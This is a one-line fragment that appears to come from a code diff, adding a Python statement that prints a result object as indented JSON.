+        print(json.dumps(res, indent=2, ensure_ascii=False))
